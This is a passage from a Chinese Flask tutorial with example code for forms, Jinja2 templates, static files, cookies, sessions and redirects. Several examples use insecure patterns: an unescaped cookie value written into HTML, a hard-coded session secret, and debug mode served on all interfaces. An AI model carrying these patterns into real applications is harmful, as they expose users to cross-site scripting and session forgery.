      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>http://localhost:5000/login<span class="token punctuation">"</span></span> <span class="token attr-name">method</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Enter Name:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>nm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> request
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success/&lt;name>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'welcome &#123; &#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
       user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'nm'</span><span class="token punctuation">]</span>  <span class="token comment">#获取参数nm的值</span>
       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span>name <span class="token operator">=</span> user<span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token keyword">else</span><span class="token punctuation">:</span>
       user <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'nm'</span><span class="token punctuation">)</span>
       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">,</span>name <span class="token operator">=</span> user<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p><strong>Request</strong>对象</p>
<ul>
<li><strong>Form</strong>：是一个字典对象,包含表单参数及其值的键和值对。</li>
<li><strong>args</strong>：解析查询字符串的内容，是包含表单参数对及其对应值对的列表的字典对象</li>
<li><strong>Cookies</strong>：保存Cookie名称和值的字典对象。</li>
<li><strong>files</strong>：与上传文件有关的数据。</li>
<li><strong>method</strong>：当前请求方法。</li>
</ul>
<p>输入flask回车后先跳转到<code>http://127.0.0.1:5000/login</code>然后自动POST一个nm参数后302重定向到<code>http://127.0.0.1:5000/success/flask</code>输出welcome flask</p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> <span class="token string">'&lt;h1>Hello World&lt;/h1>'</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
   app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>访问网站会得到一个Hello World标题，但这样吧标签插入在python代码中就很麻烦，于是这里就引入了<strong>Jinja2</strong>模板引擎，可以通过<strong>render_template()</strong>函数呈现HTML文件。</p>
<p>新建一个templates文件夹，在其中建立一个hello.html文件：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello &#123; &#123;  marks &#125;&#125;!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/hello/&lt;score>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_name</span><span class="token punctuation">(</span>score<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'hello.html'</span><span class="token punctuation">,</span>marks <span class="token operator">=</span> score<span class="token punctuation">)</span><span class="token comment">#自动寻找目录下的templates文件夹下的html文件</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>访问<code>http://127.0.0.1:5000/hello/flask</code>则会输出<code>Hello flask!</code>标题</p>
<p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p>
<ul>
<li><strong><code>&#123;% ... %&#125;</code></strong>：用于语句</li>
<li><strong><code>&#123;&#123;  ... &#125;&#125;</code></strong>：用于表达式可以打印到模板输出</li>
<li><strong>``</strong>：用于未包含在模板输出中的注释</li>
<li><strong><code># ... ##</code></strong>：用于行语句</li>
</ul>
<p>另外测试语句效果，修改hello.html为以下内容</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
&#123;% if marks>50 %&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span> Your result is pass!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
&#123;% else %&#125;
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Your result is fail<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
&#123;% endif %&#125;</code></pre>

<p>脚本中<code>@app.route(&#39;/hello/&lt;score&gt;&#39;)</code>修改为<code>@app.route(&#39;/hello/&lt;int:score&gt;&#39;)</code></p>
<p>则当访问<code>http://127.0.0.1:5000/hello/1</code>时输出<code>Your result is fail</code></p>
<p>则当访问<code>http://127.0.0.1:5000/hello/100</code>时输出<code>Your result is pass!</code></p>
<p>注意这里必须要对传入的score定义为int型，否则会被当成字符串处理，就会一直输出<code>Your result is pass!</code></p>
<h2 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h2><p>hello.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> 
         <span class="token attr-name">src</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>&#123;&#123;  url_for(<span class="token punctuation">'</span>static<span class="token punctuation">'</span>, filename = <span class="token punctuation">'</span>hello.js<span class="token punctuation">'</span>) &#125;&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token attr-name">value</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> <span class="token punctuation">"</span>Say Hello<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>hello.js</p>
<pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Hello World"</span><span class="token punctuation">)</span>
 <span class="token punctuation">&#125;</span></code></pre>

<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"hello.html"</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>访问<code>http://127.0.0.1:5000/</code>点击Say Hello弹窗Hello World</p>
<h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/setcookie'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
       user <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'nm'</span><span class="token punctuation">]</span>
       resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'readcookie.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
       resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'userID'</span><span class="token punctuation">,</span>user<span class="token punctuation">)</span>
       <span class="token keyword">return</span> resp
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/getcookie'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">getcookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   name <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'userID'</span><span class="token punctuation">)</span>
   a <span class="token operator">=</span> <span class="token string">"&lt;h1>welcome '&#123; &#125;'&lt;/h1>"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
   <span class="token keyword">return</span> a
   
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>index.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/setcookie<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>Enter userID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>text<span class="token punctuation">'</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>nm<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>submit<span class="token punctuation">'</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Login<span class="token punctuation">'</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>readcookie.html</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span>  <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://192.168.0.102:5000/getcookie<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Click here to read cookie<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>首先在访问<code>http://127.0.0.1:5000/</code>传入flask，点击Click here to read cookie即可看到<code>welcome &#39;flask&#39;</code></p>
<h2 id="会话"><a href="#会话" class="headerlink" title="会话"></a>会话</h2><p>session是存储在服务器上的，会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session
<span class="token keyword">import</span> os
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'any random string'</span>
<span class="token comment">#app.secret_key = os.urandom(12)</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> <span class="token string">'Logged in as '</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span> <span class="token string">"&lt;b>&lt;a href = '/logout'>click here to log out&lt;/a>&lt;/b>"</span>
    <span class="token keyword">return</span> <span class="token string">"You are not logged in &lt;br>&lt;a href = '/login'>&lt;/b>"</span> <span class="token operator">+</span> <span class="token string">"click here to log in&lt;/b>&lt;/a>"</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''
   &lt;form action = "" method = "post">
      &lt;p>&lt;input type = text name = username />&lt;/p>
      &lt;p>&lt;input type = submit value = Login />&lt;/p>
   &lt;/form>
   '''</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span><span class="token boolean">None</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>这里将session_key设置成了any random string</p>
<h2 id="重定向和错误"><a href="#重定向和错误" class="headerlink" title="重定向和错误"></a>重定向和错误</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session
<span class="token keyword">import</span> os
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/success'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'logged in successfully'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>

<p>当用户输入不为admin时则直接302重定向到login界面</p>
<p>login.html</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>html<span class="token operator">></span>
   <span class="token operator">&lt;</span>body<span class="token operator">></span>
      <span class="token operator">&lt;</span>form action <span class="token operator">=</span> <span class="token string">"http://192.168.0.102:5000/login"</span> method <span class="token operator">=</span> <span class="token string">"post"</span><span class="token operator">></span>
         <span class="token operator">&lt;</span>p<span class="token operator">></span>Enter Name<span class="token punctuation">:</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
         <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">"text"</span> name <span class="token operator">=</span> <span class="token string">"username"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
         <span class="token operator">&lt;</span>p<span class="token operator">></span><span class="token operator">&lt;</span><span class="token builtin">input</span> <span class="token builtin">type</span> <span class="token operator">=</span> <span class="token string">"submit"</span> value <span class="token operator">=</span> <span class="token string">"submit"</span> <span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">></span>
   <span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">></span></code></pre>

<p>报错：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:UTF-8 -*-</span>
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>redirect<span class="token punctuation">,</span>url_for<span class="token punctuation">,</span>request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>make_response<span class="token punctuation">,</span>escape<span class="token punctuation">,</span>session<span class="token punctuation">,</span>abort
<span class="token keyword">import</span> os
app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>

